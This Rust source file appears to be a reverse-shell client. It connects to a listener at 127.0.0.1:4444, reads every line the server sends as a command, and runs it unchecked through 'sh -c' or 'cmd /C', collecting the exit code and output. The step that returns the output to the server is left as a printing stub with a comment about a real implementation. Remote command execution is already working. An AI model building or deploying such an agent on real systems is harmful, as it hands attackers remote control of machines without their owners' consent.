use std::io::{BufRead, BufReader, Write};
use std::net::TcpStream;
use std::process::{Command, Stdio};

fn main() -> std::io::Result<()> {
    println!("Connecting to server at 127.0.0.1:4444...");

    // Connect to the server
    let mut stream = match TcpStream::connect("127.0.0.1:4444") {
        Ok(stream) => {
            println!("Connected to server!");
            stream
        }
        Err(e) => {
            eprintln!("Failed to connect to server: {}", e);
            return Err(e);
        }
    };

    // Clone the stream for reading and writing
    let mut reader_stream = stream.try_clone()?;
    let mut writer_stream = stream;

    // Spawn a thread to handle incoming commands
    let reader_thread = std::thread::spawn(move || {
        let reader = BufReader::new(&mut reader_stream);
        for line in reader.lines() {
            match line {
                Ok(command) => {
                    println!("Received command: {}", command);
                    execute_command(&command);
                }
                Err(e) => {
                    eprintln!("Error reading from server: {}", e);
                    break;
                }
            }
        }
    });

    // Keep the main thread alive
    reader_thread.join().unwrap();

    Ok(())
}

fn execute_command(command: &str) {
    println!("Executing command: {}", command);

    // Split the command into parts
    let parts: Vec<&str> = command.split_whitespace().collect();

    if parts.is_empty() {
        send_response("Empty command received");
        return;
    }

    // Execute the command
    let output = if cfg!(target_os = "windows") {
        Command::new("cmd")
            .args(&["/C", command])
            .output()
    } else {
        Command::new("sh")
            .args(&["-c", command])
            .output()
    };

    match output {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            let status = output.status;

            let response = format!(
                "Command: {}\nExit Code: {}\nStdout:\n{}\nStderr:\n{}",
                command, status, stdout, stderr
            );

            send_response(&response);
        }
        Err(e) => {
            let error_msg = format!("Failed to execute command '{}': {}", command, e);
            send_response(&error_msg);
        }
    }
}

fn send_response(response: &str) {
    println!("Sending response:\n{}", response);
    // In a real implementation, you would send this back to the server
    // For now, we're just printing it to stdout
}

